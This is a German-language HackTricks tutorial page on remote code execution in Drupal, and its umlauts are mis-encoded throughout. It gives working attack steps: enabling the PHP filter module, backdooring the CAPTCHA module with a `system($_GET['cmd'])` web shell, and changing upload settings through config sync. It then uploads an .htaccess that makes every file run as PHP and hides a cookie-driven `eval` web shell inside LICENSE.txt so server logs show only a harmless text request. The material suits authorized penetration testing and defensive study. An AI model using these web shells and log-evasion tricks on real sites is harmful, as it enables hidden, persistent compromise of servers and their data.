# Drupal RCE

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Mit dem PHP-Filtermodul

{% hint style="warning" %}
In √§lteren Versionen von Drupal **(vor Version 8)** war es m√∂glich, sich als Admin anzumelden und **das `PHP filter`-Modul zu aktivieren**, das "Eingebetteten PHP-Code/Snippets die Auswertung erlaubt." Ab Version 8 ist dieses Modul jedoch nicht standardm√§√üig installiert.
{% endhint %}

Sie m√ºssen das **Plugin php installiert haben** (√ºberpr√ºfen Sie, indem Sie auf _/modules/php_ zugreifen; wenn es **403** zur√ºckgibt, **existiert** es, wenn **nicht gefunden**, dann ist das **Plugin php nicht installiert**)

Gehen Sie zu _Module_ -> (**√úberpr√ºfen**) _PHP-Filter_ -> _Konfiguration speichern_

![](<../../../.gitbook/assets/image (247) (1).png>)

Klicken Sie dann auf _Inhalt hinzuf√ºgen_ -> W√§hlen Sie _Basis-Seite_ oder _Artikel_ -> Schreiben Sie _php shellcode in den Textk√∂rper_ -> W√§hlen Sie _PHP-Code_ im _Textformat_ -> W√§hlen Sie _Vorschau_

![](<../../../.gitbook/assets/image (338).png>)

Zugreifen Sie schlie√ülich auf den neu erstellten Knoten:
```bash
curl http://drupal-site.local/node/3
```
## Installieren des PHP-Filtermoduls

{% hint style="warning" %}
In aktuellen Versionen ist es nicht mehr m√∂glich, Plugins nur mit Zugriff auf das Web nach der Standardinstallation zu installieren.
{% endhint %}

Ab Version **8 ist das** [**PHP-Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **Modul nicht standardm√§√üig installiert**. Um diese Funktionalit√§t zu nutzen, m√ºssen wir **das Modul selbst installieren**.

1. Laden Sie die neueste Version des Moduls von der Drupal-Website herunter.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Gehen Sie nach dem Herunterladen zu **`Administration`** > **`Reports`** > **`Available updates`**.
3. Klicken Sie auf **`Browse`**, w√§hlen Sie die Datei aus dem Verzeichnis aus, in das wir sie heruntergeladen haben, und klicken Sie dann auf **`Install`**.
4. Sobald das Modul installiert ist, k√∂nnen wir auf **`Content`** klicken und **eine neue Basis-Seite erstellen**, √§hnlich wie wir es im Drupal 7-Beispiel gemacht haben. Stellen Sie erneut sicher, dass Sie **`PHP code` aus dem Dropdown-Men√º `Text format` ausw√§hlen**.

## Hintert√ºr-Modul

{% hint style="warning" %}
In aktuellen Versionen ist es nicht mehr m√∂glich, Plugins nur mit Zugriff auf das Web nach der Standardinstallation zu installieren.
{% endhint %}

Ein hintert√ºriges Modul kann erstellt werden, indem **eine Shell zu einem bestehenden Modul hinzugef√ºgt wird**. Module k√∂nnen auf der drupal.org-Website gefunden werden. W√§hlen wir ein Modul wie [CAPTCHA](https://www.drupal.org/project/captcha). Scrollen Sie nach unten und kopieren Sie den Link f√ºr das tar.gz [Archiv](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Laden Sie das Archiv herunter und extrahieren Sie dessen Inhalt.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Erstellen Sie eine **PHP-Web-Shell** mit den Inhalten:
```php
<?php
system($_GET["cmd"]);
?>
```
* Als N√§chstes m√ºssen wir eine **`.htaccess`**-Datei erstellen, um uns Zugang zum Ordner zu verschaffen. Dies ist notwendig, da Drupal den direkten Zugriff auf den **`/modules`**-Ordner verweigert.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Die obige Konfiguration wird Regeln f√ºr den /-Ordner anwenden, wenn wir eine Datei im /modules-Ordner anfordern. Kopiere beide Dateien in den captcha-Ordner und erstelle ein Archiv.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Angenommen, wir haben **administrativen Zugriff** auf die Website, klicken Sie auf **`Verwalten`** und dann auf **`Erweitern`** in der Seitenleiste. Klicken Sie dann auf die Schaltfl√§che **`+ Neues Modul installieren`**, und wir werden zur Installationsseite weitergeleitet, wie `http://drupal-site.local/admin/modules/install`. Durchsuchen Sie das Backdoored Captcha-Archiv und klicken Sie auf **`Installieren`**.
* Sobald die Installation erfolgreich ist, navigieren Sie zu **`/modules/captcha/shell.php`**, um Befehle auszuf√ºhren.

## Backdooring Drupal mit Konfigurationssynchronisierung <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Beitrag geteilt von** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Teil 1 (Aktivierung von _Media_ und _Media Library_)

Im Men√º _Erweitern_ (/admin/modules) k√∂nnen Sie aktivieren, was wie bereits installierte Plugins aussieht. Standardm√§√üig scheinen die Plugins _Media_ und _Media Library_ nicht aktiviert zu sein, also lassen Sie uns diese aktivieren.

Vor der Aktivierung:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Nach der Aktivierung:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Teil 2 (Nutzung der Funktion _Konfigurationssynchronisierung_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Wir werden die Funktion _Konfigurationssynchronisierung_ nutzen, um Drupal-Konfigurationseintr√§ge zu dumpen (exportieren) und hochzuladen (importieren):

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Lassen Sie uns mit dem Patchen des ersten Eintrags `allow_insecure_uploads` beginnen:

Datei: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Zu:

Datei: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

Dann patchen Sie den zweiten Eintrag `file_extensions` von:

Datei: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Zu:

Datei: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Ich verwende es in diesem Blogbeitrag nicht, aber es wird angemerkt, dass es m√∂glich ist, den Eintrag `file_directory` beliebig zu definieren und dass er anf√§llig f√ºr einen Path Traversal-Angriff ist (so k√∂nnen wir im Drupal-Dateisystembaum nach oben navigieren).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Teil 3 (Nutzung der Funktion _Dokument hinzuf√ºgen_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Der letzte Schritt ist der einfachste und wird in zwei Unter Schritte unterteilt. Der erste besteht darin, eine Datei im .htaccess-Format hochzuladen, um die Apache-Direktiven zu nutzen und .txt-Dateien vom PHP-Engine interpretieren zu lassen. Der zweite besteht darin, eine .txt-Datei hochzuladen, die unser Payload enth√§lt.

Datei: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Warum ist dieser Trick cool?

Weil, sobald die Webshell (die wir LICENSE.txt nennen) auf dem Webserver abgelegt ist, k√∂nnen wir unsere Befehle √ºber `$_COOKIE` √ºbertragen und im Webserver-Log wird dies als legitime GET-Anfrage an eine Textdatei angezeigt.

Warum nennen wir unsere Webshell LICENSE.txt?

Einfach, weil wir die folgende Datei nehmen, zum Beispiel [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (die bereits im Drupal-Kern vorhanden ist), haben wir eine Datei mit 339 Zeilen und 17,6 KB Gr√∂√üe, die perfekt ist, um einen kleinen PHP-Code-Schnipsel in der Mitte hinzuzuf√ºgen (da die Datei gro√ü genug ist).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Datei: Gepatchte LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Teil 3.1 (Datei .htaccess hochladen)**

Zuerst nutzen wir die Funktion _Dokument hinzuf√ºgen_ (/media/add/document), um unsere Datei mit den Apache-Direktiven (.htaccess) hochzuladen.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Teil 3.2 (Datei LICENSE.txt hochladen)**

Dann nutzen wir erneut die Funktion _Dokument hinzuf√ºgen_ (/media/add/document), um eine Webshell, die in einer Lizenzdatei versteckt ist, hochzuladen.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Teil 4 (Interaktion mit der Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Der letzte Teil besteht darin, mit der Webshell zu interagieren.

Wie im folgenden Screenshot gezeigt, erhalten wir das nachfolgende Ergebnis, wenn das von unserer Webshell erwartete Cookie nicht definiert ist, w√§hrend wir die Datei √ºber einen Webbrowser aufrufen.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Wenn der Angreifer das Cookie setzt, kann er mit der Webshell interagieren und beliebige Befehle ausf√ºhren.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Und wie Sie in den Protokollen sehen k√∂nnen, sieht es so aus, als w√§re nur eine txt-Datei angefordert worden.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Vielen Dank, dass Sie sich die Zeit genommen haben, diesen Artikel zu lesen. Ich hoffe, er hilft Ihnen, einige Shells zu erhalten.

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterst√ºtzen</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
